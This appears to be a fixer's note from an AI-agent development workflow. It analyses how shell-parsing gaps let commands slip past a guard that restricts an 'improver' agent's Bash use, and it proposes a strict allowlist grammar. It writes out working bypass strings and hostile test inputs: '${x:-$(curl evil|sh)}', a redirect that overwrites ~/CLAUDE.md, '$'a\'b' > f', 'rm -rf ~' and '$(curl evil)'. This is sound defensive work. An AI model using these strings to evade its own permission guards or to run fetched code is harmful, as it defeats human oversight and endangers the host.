# Fixer: w-7ec48ee9, visit 2 (from review visit 2)

## Failure
Review v2, blocking B1: `${…}` hides commands and redirections from guard rule 7. `gf improvement start si-1 ${x:-'}'} > ~/CLAUDE.md` and `gf improvement start si-1 ${x:-$(curl evil|sh)}` are both allowed (workflow/slices/guardAgentActions/improver.go:143, shell.go `segments` `${` case). This is the second blocking finding on the same rule, rule 7's Bash check, and this work has used 2 of its 3 reworks.

## Reproduction
I ran a throwaway probe through `go test -overlay`. The test file stayed in the scratchpad, so nothing was written to the repo. It calls `redirectsToAFile`, `onlyGfImprovement` and `clearsEnvironment` directly. "allowed" below means redirect=false, onlyGf=true and clears=false:

```
go test -overlay <scratch>/overlay.json -run TestProbeFixer2 -v ./workflow/slices/guardAgentActions/
gf improvement start si-1 ${x:-'}'} > /tmp/f          redirect=false onlyGf=true   <- allowed (review B1, scenario 1)
gf improvement start si-1 ${x:-$(curl evil|sh)}       redirect=false onlyGf=true   <- allowed (review B1, scenario 2)
gf improvement start si-1 $'a\'b' > /tmp/f            redirect=false onlyGf=true   <- allowed: NEW, not in the review
gf improvement start si-1 $( echo ')' ; curl evil )   onlyGf=false                 (denied)
gf improvement start si-1 > /dev/null                 allowed                      (allowed by the owner's choice)
gf improvement applied si-1 --summary 'a > b'         allowed                      (correct)
```

I checked the new case against bash: `bash -c "echo hi \$'a\\'b' > pwn3"` created `pwn3` containing `hi a'b`. In ANSI-C quoting (`$'…'`), `\'` is an escaped quote. The guard's reader ends the quote at that `\'`, then opens a quote that never closes, and so never sees the `> /tmp/f`. Fixing only `${…}`, as the review's first fix direction suggests, would still leave this hole open.

## Root cause
- Symptom: any shell construct that rule 7's hand-written reader parses differently from bash hides a redirection or a command. Review v1 found plain `>`. Review v2 found `${…}`. This visit found `$'…'` too (probe above).
- Cause: rule 7 is a **blacklist over a partial shell parser**. `redirectsToAFile` (improver.go:105–169) and `segments` (shell.go) look for bad things (an unquoted `>`, a program that isn't gf) and allow everything they don't recognize. Bash has many quoting and expansion forms: `${…}` with nested quotes and substitutions, `$'…'`, `$"…"`, arithmetic, process substitution, brace expansion, here-docs, and parentheses inside quotes inside `$(…)`. Each one the reader gets wrong lets a command through. This approach is only safe if the reader agrees with bash on everything, and fixing one construct per rework cannot get there.
- Origin: **specify, with fixer v1's instructions**. The design is right. design-v1.md:104 says "Its Bash is limited to `gf improvement …`. Every other path or command is denied (D19)", which is an allowlist. But fixer-v1 ("deny any improver Bash command with an unquoted output redirection…") and then specify-v2 ("For implement: Rule 7 must deny any unquoted output redirection…", plus the case table of specific denied forms) turned it into a blacklist of redirection syntax. Implement-v2 built exactly what was specified. The spec pins individual bad forms instead of the one good form, so every form it doesn't list is allowed by default.

The improver needs only three command shapes (plugin/agents/improve-skills.md steps 2 and 4, design-v1.md:98–100):
- `gf improvement start <id>`
- `gf improvement applied <id> [--summary "<text>"]`
- `gf improvement not-applied <id> --conflict|--refused "<text>"`

None of them needs expansion, substitution, chaining or redirection. A strict allowlist of these shapes is simpler than a blacklist and fails closed: a construct the guard doesn't know is denied.

## Route
specify: the behaviour to pin changes from "these forms are denied" to "only this grammar is allowed". That needs new spec cases, one per class of construct the current spec doesn't cover (`${`, `$'`, `$"`, `$((`, `<(`, brace expansion, here-doc, `;` / `&&` / `|` chaining, and `$`/backtick inside double quotes). Several of these cases fail today: `${…}` and `$'…'` are allowed (probe above). The rule "uncovered behaviour goes to specify" applies, and the next implement then replaces the mechanism instead of patching it.

Not implement: implement could add an allowlist, and the current specs would probably still pass. But nothing would pin the grammar, and review would again have to discover holes by probing. Implement-v2 also followed specify-v2's blacklist instruction faithfully, so sending the work back to implement with the same spec repeats the pattern. Not design: design-v1.md:104 already states the allowlist ("limited to `gf improvement …`", "every other … command is denied"), so the model needs no new decision.

## For the next visit (specify)
- Wrong: rule 7 allows any Bash line its partial shell reader cannot see into. `${x:-'}'} > f`, `${x:-$(cmd)}` and `$'a\'b' > f` are all allowed (probe above; improver.go:105–169, 143).
- Change: restate the improver's Bash rule as an **allowlist grammar**, and pin it with specs. Suggested rule: a command is allowed only if, after optional leading whitespace, the whole line matches `gf [--dir <plain>] improvement (start|applied|not-applied) <id>` followed by zero or more arguments. Each argument is one of:
  - a plain word of safe characters (letters, digits, `-_.:/=@,+`);
  - a single-quoted string that contains no `'`;
  - a double-quoted string that contains none of `"`, `$`, `` ` `` or `\`.
  It may optionally end with the owner-approved suffixes ` > /dev/null`, ` 2>/dev/null` and ` 2>&1` in literal form. Nothing else is allowed: no `;`, `&`, `|`, newline, `$`, backtick, `(`, `)`, `{`, `}`, `<`, `>` (outside those suffixes), `*?[` globs or `~` outside quotes, no leading assignments (this covers S3, `GOFAST_SESSION=`), and no wrappers. Specify may tune the exact character set, but the rule must be stated as what is allowed, with everything else denied.
  - Denied cases to add (each must fail today or be pinned so it doesn't regress): review B1's two scenarios, `$'a\'b' > f`, `$"x" > f`, `$((1)) > f`, `<(curl evil)`, `{a,b}`, a here-doc (`<<EOF`), `gf improvement start si-1; curl evil`, `gf improvement start si-1 && rm -rf ~`, `--summary "$(curl evil)"`, ``--summary "`id`"``, `--summary "$HOME"`, a newline followed by a second command, a leading `X=1`.
  - Allowed cases to keep: the existing allowed rows of TestGuardAgentActions_TheImproverMayNotRedirectOutputToAFile (`'a > b'`, `"keeps >> as text"`, `> /dev/null`, `2>/dev/null`, `2>&1`), the three real command shapes with `--summary`/`--conflict`/`--refused` text in single and double quotes, and `--dir <path>`.
  - Existing denied rows stay denied. Under the allowlist they are denied by construction.
  - In the specify artifact's "For implement" section, say explicitly that rule 7 must be a whole-line allowlist match. Implement must **not** extend `redirectsToAFile`/`segments` with more blacklisted constructs. `redirectsToAFile` can then be removed. `segments` stays, because the owner-only rule uses it.
- Verify by: `go test -run 'TestGuardAgentActions_TheImprover' ./cmd/gf/`. The new denied cases for `${…}` and `$'…'` fail before implement and pass after. `go test ./...` stays green, including the owner-only guard tests. Review can then check rule 7 by reading the grammar, without trying to match bash construct by construct.
- Keep: D19, design-v1 and ADR 0004 as they are. The owner's specify-v2 decision that `/dev/null` and `2>&1` stay allowed, as literal suffixes. S3 (`GOFAST_SESSION`), now covered by the "no leading assignments" rule. Write/Edit/NotebookEdit scope through `domain.ImproverMayWrite`. The owner-only rule and `segments` (review N1, the same `${…}` blind spot in the owner-only rule, predates this work and is out of scope). A1–A17. S1, S2, S4 and S5 stay out of this route.

## Repeated failure
This is the second fixer visit for rule 7. Fixer v1 routed correctly to specify, but its instructions prescribed the mechanism ("deny … unquoted output redirection", "redirection operators recognised outside quotes in the shell reader"). That is a blacklist, and it pushed specify and implement into patching syntax. This visit corrects that by having the spec pin the one allowed grammar and deny everything else. With one rework left, another blacklist patch would very likely fail review again: `$'…'` is already a third bypass that the review didn't list.

## Decisions for the owner
- The allowlist will deny some harmless forms, for example `--summary "uses $PATH"` (the agent must use single quotes) and `cd x && gf improvement …`. The improver's prompt uses only the three plain shapes, so I recommend accepting this. If you'd rather not keep the special cases, specify can also drop the `/dev/null` and `2>&1` suffixes for a strictly simpler grammar.
